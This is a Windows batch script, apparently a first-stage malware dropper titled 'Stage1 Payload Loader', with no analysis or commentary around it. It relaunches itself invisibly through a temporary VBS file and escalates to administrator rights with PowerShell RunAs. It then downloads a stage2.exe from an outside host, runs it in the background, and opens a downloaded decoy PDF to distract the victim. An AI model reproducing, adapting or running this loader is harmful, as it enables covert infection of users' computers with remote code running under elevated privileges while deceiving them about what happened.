@echo off
title Stage1 Payload Loader (EXE)

:: If already running in hidden mode, skip to main logic
if "%1"=="--hidden" goto hidden

:: Create a temporary VBS script to launch this batch file invisibly
set "vbs=%temp%\stealth_%random%.vbs"
echo CreateObject("WScript.Shell").Run """" ^& WScript.Arguments(0) ^& """" ^& " --hidden", 0, False > "%vbs%"
wscript "%vbs%" "%~f0"
del "%vbs%"
exit /b

:hidden
:: ------------------------------------------------------------------
:: Now running in hidden mode (no console window)
:: ------------------------------------------------------------------

:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Not admin – relaunch elevated and hidden
    powershell -Command "Start-Process '%~f0' -ArgumentList '--hidden' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: At this point, the script is running elevated and hidden
echo Running with administrator privileges.

:: Download and execute stage2.exe
echo [!] Downloading stage2.exe from https://domenca.vercel.app/generated/payloads/stage2.exe
echo %date% %time% - Starting download > "%TEMP%\stage1_log.txt"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist "%TEMP%\stage2.exe" (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> "%TEMP%\stage1_log.txt"
    start /B "" "%TEMP%\stage2.exe"
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> "%TEMP%\stage1_log.txt"
)

:: Download and open decoy PDF
echo [2] Opening document.pdf...
echo %date% %time% - Downloading document.pdf >> "%TEMP%\stage1_log.txt"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/document.pdf', '%TEMP%\document.pdf')" && start "" "%TEMP%\document.pdf"
echo %date% %time% - Decoy opened >> "%TEMP%\stage1_log.txt"
